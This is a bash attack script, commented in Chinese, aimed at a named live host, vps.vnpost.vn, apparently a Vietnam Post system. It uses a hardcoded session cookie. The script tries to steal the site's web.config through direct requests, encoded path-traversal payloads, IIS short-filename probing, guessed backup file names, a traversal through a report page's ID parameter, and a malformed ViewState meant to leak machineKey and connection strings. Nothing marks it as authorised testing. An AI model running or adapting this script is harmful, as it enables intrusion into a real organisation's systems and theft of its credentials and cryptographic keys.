#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥🔥🔥 Phase 2: 死磕获取web.config"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 1. 直接访问
echo -e "\n[1] 直接访问尝试..."
PATHS=(
    "/web.config"
    "/Web.config"
    "/WEB.CONFIG"
    "/chamcong/web.config"
    "/chamcong/Web.config"
    "/chamcong/WEB.CONFIG"
)

for path in "${PATHS[@]}"; do
    echo -n "  $path: "
    resp=$(curl -sk "${BASE}${path}" -w "%{http_code}" -o "webconfig_$(echo $path | tr '/' '_').txt" 2>&1)
    size=$(wc -c < "webconfig_$(echo $path | tr '/' '_').txt")
    
    if [ $size -gt 100 ] && grep -qi "configuration\|connectionStrings\|machineKey" "webconfig_$(echo $path | tr '/' '_').txt"; then
        echo "🔥🔥🔥 成功! $size bytes"
        echo "$path" >> webconfig_found.txt
        cat "webconfig_$(echo $path | tr '/' '_').txt" | head -50
    else
        echo "- ($resp, $size bytes)"
    fi
done

# 2. 路径遍历
echo -e "\n[2] 路径遍历尝试..."
TRAVERSALS=(
    "../web.config"
    "../../web.config"
    "../../../web.config"
    "..\web.config"
    "..\..\web.config"
    "%2e%2e/web.config"
    "%2e%2e%2f%2e%2e%2fweb.config"
    "..%252f..%252fweb.config"
    "..%c0%af..%c0%afweb.config"
)

for trav in "${TRAVERSALS[@]}"; do
    echo -n "  /chamcong/report/${trav}: "
    resp=$(curl -sk "${BASE}/chamcong/report/${trav}" \
        -H "Cookie: $COOKIE" \
        -o "trav_$(echo $trav | md5sum | cut -d' ' -f1).txt" 2>&1)
    size=$(wc -c < "trav_$(echo $trav | md5sum | cut -d' ' -f1).txt")
    
    if [ $size -gt 100 ] && grep -qi "configuration" "trav_$(echo $trav | md5sum | cut -d' ' -f1).txt"; then
        echo "🔥🔥🔥 成功!"
        cat "trav_$(echo $trav | md5sum | cut -d' ' -f1).txt" | head -30
    else
        echo "- ($size bytes)"
    fi
done

# 3. IIS短文件名
echo -e "\n[3] IIS短文件名攻击..."
SHORT_NAMES=(
    "/WEB~1.CON"
    "/web~1.con"
    "/chamcong/WEB~1.CON"
    "/chamcong/web~1.con"
)

for short in "${SHORT_NAMES[@]}"; do
    echo -n "  $short: "
    curl -sk "${BASE}${short}" \
        -o "short_$(echo $short | md5sum | cut -d' ' -f1).txt" 2>&1
    size=$(wc -c < "short_$(echo $short | md5sum | cut -d' ' -f1).txt")
    echo "$size bytes"
done

# 4. 备份文件
echo -e "\n[4] 备份文件尝试..."
BACKUPS=(
    "/chamcong/web.config.bak"
    "/chamcong/web.config.old"
    "/chamcong/web.config~"
    "/chamcong/web.config.txt"
    "/chamcong/backup/web.config"
    "/backup/web.config"
    "/chamcong/web.config.2024"
    "/chamcong/web.config.back"
)

for backup in "${BACKUPS[@]}"; do
    echo -n "  $backup: "
    curl -sk "${BASE}${backup}" \
        -o "backup_$(echo $backup | md5sum | cut -d' ' -f1).txt" 2>&1
    size=$(wc -c < "backup_$(echo $backup | md5sum | cut -d' ' -f1).txt")
    
    if [ $size -gt 100 ]; then
        echo "⚠️  $size bytes (可能)"
    else
        echo "- ($size bytes)"
    fi
done

# 5. 通过错误触发泄露
echo -e "\n[5] 触发错误泄露配置..."

# ASP.NET详细错误可能泄露连接字符串
curl -sk "${BASE}/chamcong/report/inBCC.aspx?ID=../../../web.config" \
    -H "Cookie: $COOKIE" \
    -o error_webconfig.html 2>&1

if grep -qi "connectionStrings\|machineKey\|appSettings" error_webconfig.html; then
    echo "  🔥🔥🔥 错误页面泄露配置!"
    grep -i "connectionStrings\|machineKey\|appSettings" error_webconfig.html | head -20
fi

# 6. 通过ViewState错误泄露machineKey
curl -sk "${BASE}/chamcong/report/inBCC.aspx?ID=MAU2" \
    -X POST \
    -H "Cookie: $COOKIE" \
    --data-urlencode "__VIEWSTATE=AAAAAAA" \
    --data-urlencode "btnExport=Export" \
    -o error_viewstate.html 2>&1

if grep -qi "machineKey\|validationKey\|decryptionKey" error_viewstate.html; then
    echo "  🔥🔥🔥 ViewState错误泄露machineKey!"
    grep -i "machineKey\|validationKey\|decryptionKey" error_viewstate.html | head -20
fi

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 web.config获取结果:"
if [ -f webconfig_found.txt ]; then
    echo "🔥 成功获取:"
    cat webconfig_found.txt
else
    echo "❌ 未成功"
fi

echo -e "\n📁 所有尝试的文件:"
ls -lh webconfig_*.txt trav_*.txt backup_*.txt error_*.html 2>/dev/null | head -20
